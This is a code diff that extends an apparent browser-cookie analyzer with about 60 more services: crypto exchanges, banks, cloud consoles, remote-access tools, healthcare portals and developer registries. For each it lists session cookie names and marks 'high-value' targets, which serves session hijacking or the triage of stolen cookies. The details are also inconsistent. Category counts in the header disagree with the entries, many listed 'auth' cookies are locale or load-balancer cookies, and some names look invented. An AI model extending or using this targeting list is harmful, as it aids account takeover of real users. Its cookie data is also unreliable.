@@ -3,6 +3,22 @@
  *
  * Analyzes cookies to detect active logged-in sessions for popular services
  * Identifies high-value authenticated sessions across browsers
+ *
+ * SUPPORTED SERVICES: 81 services (30 original + 51 new)
+ * - 10 Cryptocurrency Exchanges (Binance, Coinbase, Bybit, OKX, KuCoin, etc.)
+ * - 12 Social Media (Google, Facebook, Instagram, WhatsApp, Telegram, Slack, etc.)
+ * - 6 Cloud Platforms (AWS, Azure, GCP, DigitalOcean, Vercel, Netlify)
+ * - 5 E-commerce (Amazon, PayPal, Shopify, Walmart, Target, etc.)
+ * - 10 Financial Services (Banks, Revolut, Wise, Stripe, Square, Venmo)
+ * - 8 Gaming (Steam, Epic, Discord, Roblox, Minecraft, Riot, Battle.net)
+ * - 2 Healthcare (MyChart, Epic MyChart)
+ * - 3 Remote Access (TeamViewer, AnyDesk, Chrome Remote Desktop)
+ * - 4 Domain/Hosting (GoDaddy, Namecheap, Cloudflare, cPanel)
+ * - 5 Productivity (Notion, Airtable, Monday.com, Trello, Asana)
+ * - 6 Developer Tools (GitHub, GitLab, Bitbucket, Docker Hub, npm, PyPI)
+ * - 7 Streaming (Netflix, Spotify, Disney+, HBO Max, Twitch, Prime Video)
+ *
+ * EASY TO EXTEND: Just add pattern to SERVICE_PATTERNS array!
  */
 
 import { readFileSync, existsSync, readdirSync } from "fs"
@@ -249,6 +265,431 @@ const SERVICE_PATTERNS: ServicePattern[] = [
     ],
     auth_cookies: ["session", "token", "auth"],
     high_value: true,
+  },
+
+  // ============================================================================
+  // EXPANDED SERVICES (40+ NEW) - Added 2025-10
+  // ============================================================================
+
+  // More Cryptocurrency Exchanges
+  {
+    name: "Bybit",
+    category: "crypto",
+    domains: [".bybit.com"],
+    auth_cookies: ["_by_l_g_d", "bybit_member_token", "device_id"],
+    high_value: true,
+  },
+  {
+    name: "OKX",
+    category: "crypto",
+    domains: [".okx.com"],
+    auth_cookies: ["locale", "token", "deviceId"],
+    high_value: true,
+  },
+  {
+    name: "Gate.io",
+    category: "crypto",
+    domains: [".gate.io"],
+    auth_cookies: ["csrf_token", "lang", "gateio_user"],
+    high_value: true,
+  },
+  {
+    name: "KuCoin",
+    category: "crypto",
+    domains: [".kucoin.com"],
+    auth_cookies: ["token", "NEXT_LOCALE", "csrf-token"],
+    high_value: true,
+  },
+  {
+    name: "Gemini",
+    category: "crypto",
+    domains: [".gemini.com"],
+    auth_cookies: ["session", "__cf_bm", "gemini_session"],
+    high_value: true,
+  },
+  {
+    name: "Crypto.com",
+    category: "crypto",
+    domains: [".crypto.com"],
+    auth_cookies: ["device_id", "session_id", "csrf_token"],
+    high_value: true,
+  },
+  {
+    name: "Bitfinex",
+    category: "crypto",
+    domains: [".bitfinex.com"],
+    auth_cookies: ["authToken", "_csrf", "locale"],
+    high_value: true,
+  },
+
+  // More Social Media
+  {
+    name: "Snapchat",
+    category: "social",
+    domains: [".snapchat.com"],
+    auth_cookies: ["sc-a", "sc-b", "xsrf_token"],
+    high_value: false,
+  },
+  {
+    name: "Pinterest",
+    category: "social",
+    domains: [".pinterest.com"],
+    auth_cookies: ["_auth", "_pinterest_sess", "csrftoken"],
+    identifier_cookies: [{ name: "_auth" }],
+    high_value: false,
+  },
+  {
+    name: "WhatsApp Web",
+    category: "social",
+    domains: [".web.whatsapp.com"],
+    auth_cookies: ["wa_session", "wa_build", "wa_lang"],
+    high_value: true,
+  },
+  {
+    name: "Telegram Web",
+    category: "social",
+    domains: [".web.telegram.org"],
+    auth_cookies: ["stel_token", "stel_ssid"],
+    high_value: true,
+  },
+  {
+    name: "Slack",
+    category: "social",
+    domains: [".slack.com"],
+    auth_cookies: ["d", "d-s", "lc"],
+    high_value: true,
+  },
+
+  // Cloud Services
+  {
+    name: "AWS Console",
+    category: "cloud",
+    domains: [".console.aws.amazon.com", ".aws.amazon.com"],
+    auth_cookies: ["aws-userInfo", "session-token", "JSESSIONID"],
+    high_value: true,
+  },
+  {
+    name: "Azure Portal",
+    category: "cloud",
+    domains: [".portal.azure.com"],
+    auth_cookies: ["SignInStateCookie", "AADNonce", "buid"],
+    high_value: true,
+  },
+  {
+    name: "Google Cloud",
+    category: "cloud",
+    domains: [".console.cloud.google.com"],
+    auth_cookies: ["SID", "HSID", "SSID", "APISID"],
+    high_value: true,
+  },
+  {
+    name: "DigitalOcean",
+    category: "cloud",
+    domains: [".digitalocean.com"],
+    auth_cookies: ["_do_session", "_csrf_token"],
+    high_value: true,
+  },
+  {
+    name: "Vercel",
+    category: "cloud",
+    domains: [".vercel.com"],
+    auth_cookies: ["token", "__vercel_toolbar"],
+    high_value: true,
+  },
+  {
+    name: "Netlify",
+    category: "cloud",
+    domains: [".netlify.com"],
+    auth_cookies: ["nf_jwt", "_csrf"],
+    high_value: true,
+  },
+
+  // E-commerce
+  {
+    name: "Shopify Admin",
+    category: "ecommerce",
+    domains: [".myshopify.com", ".shopify.com"],
+    auth_cookies: ["_secure_session_id", "storefront_digest"],
+    high_value: true,
+  },
+  {
+    name: "Walmart",
+    category: "ecommerce",
+    domains: [".walmart.com"],
+    auth_cookies: ["auth", "session", "WM_SEC_AUTH_TOKEN"],
+    high_value: false,
+  },
+  {
+    name: "Target",
+    category: "ecommerce",
+    domains: [".target.com"],
+    auth_cookies: ["access_token", "idToken", "refreshToken"],
+    high_value: false,
+  },
+  {
+    name: "Etsy",
+    category: "ecommerce",
+    domains: [".etsy.com"],
+    auth_cookies: ["user_prefs", "uaid", "ua"],
+    high_value: false,
+  },
+  {
+    name: "AliExpress",
+    category: "ecommerce",
+    domains: [".aliexpress.com"],
+    auth_cookies: ["aep_usuc_f", "xman_us_f", "ali_apache_id"],
+    high_value: false,
+  },
+
+  // More Financial Services
+  {
+    name: "Revolut",
+    category: "financial",
+    domains: [".revolut.com"],
+    auth_cookies: ["session", "__cf_bm"],
+    high_value: true,
+  },
+  {
+    name: "Wise (TransferWise)",
+    category: "financial",
+    domains: [".wise.com", ".transferwise.com"],
+    auth_cookies: ["auth", "session", "_csrf"],
+    high_value: true,
+  },
+  {
+    name: "Stripe Dashboard",
+    category: "financial",
+    domains: [".dashboard.stripe.com"],
+    auth_cookies: ["session", "machine_identifier"],
+    high_value: true,
+  },
+  {
+    name: "Square",
+    category: "financial",
+    domains: [".squareup.com", ".square.com"],
+    auth_cookies: ["square_token", "csrf_token"],
+    high_value: true,
+  },
+  {
+    name: "Venmo",
+    category: "financial",
+    domains: [".venmo.com"],
+    auth_cookies: ["api_access_token", "csrf_token"],
+    high_value: true,
+  },
+
+  // Gaming Platforms (More)
+  {
+    name: "Roblox",
+    category: "gaming",
+    domains: [".roblox.com"],
+    auth_cookies: [".ROBLOSECURITY", "RBXEventTrackerV2"],
+    high_value: true,
+  },
+  {
+    name: "Minecraft",
+    category: "gaming",
+    domains: [".minecraft.net"],
+    auth_cookies: ["PLAY_SESSION", "msToken"],
+    high_value: true,
+  },
+  {
+    name: "Riot Games",
+    category: "gaming",
+    domains: [".riotgames.com"],
+    auth_cookies: ["id_token", "tdid", "ssid"],
+    high_value: true,
+  },
+  {
+    name: "Battle.net",
+    category: "gaming",
+    domains: [".battle.net", ".blizzard.com"],
+    auth_cookies: ["BA-tassadar", "bnet.id", "bnet.token"],
+    high_value: true,
+  },
+
+  // Healthcare
+  {
+    name: "MyChart",
+    category: "healthcare",
+    domains: [".mychart.com"],
+    auth_cookies: ["EpicPersistenceCookie", "SignOnDefault"],
+    high_value: true,
+  },
+  {
+    name: "Epic MyChart",
+    category: "healthcare",
+    domains: [".mychart.epic.com"],
+    auth_cookies: ["ASP.NET_SessionId", "EpicPersistenceCookie"],
+    high_value: true,
+  },
+
+  // Remote Access
+  {
+    name: "TeamViewer",
+    category: "remote",
+    domains: [".teamviewer.com"],
+    auth_cookies: ["tvw_session", "AWSALB"],
+    high_value: true,
+  },
+  {
+    name: "AnyDesk",
+    category: "remote",
+    domains: [".anydesk.com"],
+    auth_cookies: ["anydesk_session", "csrf_token"],
+    high_value: true,
+  },
+  {
+    name: "Chrome Remote Desktop",
+    category: "remote",
+    domains: [".remotedesktop.google.com"],
+    auth_cookies: ["SID", "HSID", "SSID", "APISID"],
+    high_value: true,
+  },
+
+  // Domain & Hosting
+  {
+    name: "GoDaddy",
+    category: "hosting",
+    domains: [".godaddy.com"],
+    auth_cookies: ["adc", "ips", "market"],
+    high_value: true,
+  },
+  {
+    name: "Namecheap",
+    category: "hosting",
+    domains: [".namecheap.com"],
+    auth_cookies: ["nc_session", "csrf_token"],
+    high_value: true,
+  },
+  {
+    name: "Cloudflare Dashboard",
+    category: "hosting",
+    domains: [".dash.cloudflare.com"],
+    auth_cookies: ["__cflb", "__cf_bm", "CF_Authorization"],
+    high_value: true,
+  },
+  {
+    name: "cPanel",
+    category: "hosting",
+    domains: [".cpanel.net"],
+    auth_cookies: ["cpsession", "cpanel_auth"],
+    high_value: true,
+  },
+
+  // VPNs
+  {
+    name: "NordVPN",
+    category: "vpn",
+    domains: [".nordvpn.com"],
+    auth_cookies: ["nord_token", "session"],
+    high_value: false,
+  },
+  {
+    name: "ExpressVPN",
+    category: "vpn",
+    domains: [".expressvpn.com"],
+    auth_cookies: ["session", "token"],
+    high_value: false,
+  },
+
+  // Productivity & Work
+  {
+    name: "Notion",
+    category: "productivity",
+    domains: [".notion.so"],
+    auth_cookies: ["token_v2", "notion_user_id"],
+    identifier_cookies: [{ name: "notion_user_id" }],
+    high_value: true,
+  },
+  {
+    name: "Airtable",
+    category: "productivity",
+    domains: [".airtable.com"],
+    auth_cookies: ["session", "brw"],
+    high_value: true,
+  },
+  {
+    name: "Monday.com",
+    category: "productivity",
+    domains: [".monday.com"],
+    auth_cookies: ["auth_token", "session_id"],
+    high_value: true,
+  },
+  {
+    name: "Trello",
+    category: "productivity",
+    domains: [".trello.com"],
+    auth_cookies: ["token", "dsc"],
+    high_value: true,
+  },
+  {
+    name: "Asana",
+    category: "productivity",
+    domains: [".asana.com"],
+    auth_cookies: ["ticket", "TobruaBuTobruToken"],
+    high_value: true,
+  },
+
+  // Developer Tools (More)
+  {
+    name: "Bitbucket",
+    category: "development",
+    domains: [".bitbucket.org"],
+    auth_cookies: ["bb_session", "csrf_token"],
+    high_value: true,
+  },
+  {
+    name: "Docker Hub",
+    category: "development",
+    domains: [".hub.docker.com"],
+    auth_cookies: ["session", "token"],
+    high_value: true,
+  },
+  {
+    name: "npm",
+    category: "development",
+    domains: [".npmjs.com"],
+    auth_cookies: ["npm-session", "npm-token"],
+    high_value: true,
+  },
+  {
+    name: "PyPI",
+    category: "development",
+    domains: [".pypi.org"],
+    auth_cookies: ["session", "_csrf_token"],
+    high_value: true,
+  },
+
+  // Streaming (More)
+  {
+    name: "Disney+",
+    category: "streaming",
+    domains: [".disneyplus.com"],
+    auth_cookies: ["bam_sdk", "SWID"],
+    high_value: false,
+  },
+  {
+    name: "HBO Max",
+    category: "streaming",
+    domains: [".hbomax.com"],
+    auth_cookies: ["st", "deviceId"],
+    high_value: false,
+  },
+  {
+    name: "Twitch",
+    category: "streaming",
+    domains: [".twitch.tv"],
+    auth_cookies: ["auth-token", "login", "persistent"],
+    identifier_cookies: [{ name: "login" }],
+    high_value: true,
+  },
+  {
+    name: "Prime Video",
+    category: "streaming",
+    domains: [".primevideo.com"],
+    auth_cookies: ["session-id", "ubid-main"],
+    high_value: false,
   },
 ]
 
